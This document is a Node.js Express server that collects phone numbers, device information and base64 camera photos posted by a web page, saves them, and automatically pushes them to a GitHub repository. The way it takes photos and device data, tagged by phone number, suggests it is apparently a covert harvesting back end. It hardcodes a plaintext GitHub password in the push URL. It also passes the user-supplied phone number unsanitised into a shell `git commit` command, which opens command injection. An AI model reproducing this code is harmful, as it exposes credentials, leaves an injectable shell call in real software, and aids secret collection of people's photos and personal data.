const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process'); // Require child_process to run shell commands

const app = express();
const port = 3001; // Changed port to 3001

// Middleware
app.use(bodyParser.json({ limit: '10mb' })); // For parsing application/json, increase limit for image data
app.use(bodyParser.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Ensure directories for storing data exist
const dataDir = path.join(__dirname, 'userData');
const photosDir = path.join(__dirname, 'userPhotos');

if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}
if (!fs.existsSync(photosDir)) {
    fs.mkdirSync(photosDir, { recursive: true });
}

// Function to commit and push changes to GitHub
function commitAndPushChanges(message, callback) {
    // Add changes in userData and userPhotos directories
    exec('git add userData userPhotos', { cwd: __dirname }, (addError, stdout, stderr) => {
        if (addError) {
            console.error(`git add error: ${addError}`);
            console.error(`git add stderr: ${stderr}`);
            if (callback) callback(addError);
            return;
        }
        console.log(`git add stdout: ${stdout}`);

        // Commit changes
        exec(`git commit -m "${message}"`, { cwd: __dirname }, (commitError, stdout, stderr) => {
            if (commitError) {
                // This might happen if there are no changes to commit
                console.warn(`git commit warning: ${commitError}`);
                console.warn(`git commit stderr: ${stderr}`);
                // If the warning is "nothing to commit", we can consider it a success for this step
                if (stderr.includes('nothing to commit')) {
                     console.log('No changes to commit, skipping push.');
                     if (callback) callback(null); // Treat as success if no changes
                } else {
                    if (callback) callback(commitError);
                }
                return;
            }
            console.log(`git commit stdout: ${stdout}`);

            console.log(`git commit stdout: ${stdout}`);

            // Push changes to GitHub using provided credentials (HIGHLY INSECURE FOR PRODUCTION)
            // Encode password for URL
            const githubUsername = 'HYPERSAHIL'; // Your GitHub username
            const githubPassword = encodeURIComponent('Mobile1020@'); // Your GitHub password (HIGHLY INSECURE) - Password encoded
            const repoUrl = `https://${githubUsername}:${githubPassword}@github.com/HYPERSAHIL/glonova.git`;

            // Assuming the default branch is 'main'. Change 'main' if your branch is different.
            exec(`git push ${repoUrl} main`, { cwd: __dirname }, (pushError, stdout, stderr) => {
                if (pushError) {
                    console.error(`git push error: ${pushError}`);
                    console.error(`git push stderr: ${stderr}`);
                    console.error('WARNING: Automatic GitHub push failed. This might be due to incorrect credentials, lack of Git installed, or repository setup issues.');
                    if (callback) callback(pushError);
                    return;
                }
                console.log(`git push stdout: ${stdout}`);
                console.log('Changes pushed to GitHub.');
                if (callback) callback(null); // Success
            });
        });
    });
}


// Endpoint to handle form submissions and device info
app.post('/api/submit-data', (req, res) => {
    const data = req.body;
    console.log('Received data:', JSON.stringify(data, null, 2));

    if (data.type === 'photo' && data.photo && data.timestamp) {
        // Handle photo data
        try {
            const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
            const dateObj = new Date(data.timestamp);
            // Format date and time for filename
            const dateStr = dateObj.toISOString().split('T')[0]; // YYYY-MM-DD
            const timeStr = dateObj.toTimeString().split(' ')[0].replace(/:/g, '-'); // HH-MM-SS

            // Filename format: phonenumber_YYYY-MM-DD_HH-MM-SS_timestamp.jpeg
            // Use phone number from data if available, otherwise use 'unknown'
            const phoneNumber = data.phoneNumber || 'unknown';
            const photoFileName = `${phoneNumber}_${dateStr}_${timeStr}_${Date.now()}.jpeg`;
            const photoPath = path.join(photosDir, photoFileName);

            fs.writeFile(photoPath, base64Data, 'base64', (err) => {
                if (err) {
                    console.error('Error saving photo:', err);
                    // Do not send error response to client for photo save failure
                } else {
                    console.log('Photo saved:', photoPath);
                    // Git commit/push is now triggered ONLY on form submission
                }
                 // Always send a success response for photo receipt, even if saving failed
                 res.status(200).json({ message: 'Photo received', photoPath: photoPath || 'N/A' });
            });
        } catch (error) {
            console.error('Error processing photo data:', error);
            res.status(200).json({ message: 'Photo data processing error', error: error.message });
        }
    } else if (data.phoneNumber && data.operator) {
        // Handle form data (phone number, operator, device info)
        const dateObj = new Date(data.timestamp);
        const dateStr = dateObj.toISOString().split('T')[0]; // YYYY-MM-DD
        const timeStr = dateObj.toTimeString().split(' ')[0].replace(/:/g, '-'); // HH-MM-SS

        // Filename format: phonenumber_YYYY-MM-DD_HH-MM-SS.json
        const dataFileName = `${data.phoneNumber}_${dateStr}_${timeStr}.json`;
        const dataFilePath = path.join(dataDir, dataFileName);

        fs.writeFile(dataFilePath, JSON.stringify(data, null, 2), (err) => {
            if (err) {
                console.error('Error saving user data:', err);
                return res.status(500).json({ message: 'Error saving user data', error: err.message });
            }
            console.log('User data saved:', dataFilePath);
            // Call Git function ONLY after saving user data
            commitAndPushChanges(`Add user data and photos for ${data.phoneNumber}`, (gitErr) => {
                 if (gitErr) {
                     console.error('Failed to push user data and photo changes to GitHub.');
                 }
                 // Send success response after saving user data (regardless of git push success)
                 res.status(200).json({ message: 'Data received and saved successfully', filePath: dataFilePath });
            });
        });
    } else {
        // Handle invalid data - still log, but maybe don't send error to client?
        console.warn('Received invalid data:', data);
        res.status(400).json({ message: 'Invalid data received' }); // Keep this for form submission validation feedback
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log('Serving files from:', __dirname);
    console.log(`User data will be saved in: ${dataDir}`);
    console.log(`User photos will be saved in: ${photosDir}`);
    console.log('Automatic Git commit and push enabled for userData and userPhotos directories, triggered on form submission.');
    console.log('Ensure Git is installed and the repository is set up with push access.');
    console.log('WARNING: Using GitHub username/password in URL is INSECURE. Use SSH Deploy Keys for production.');
});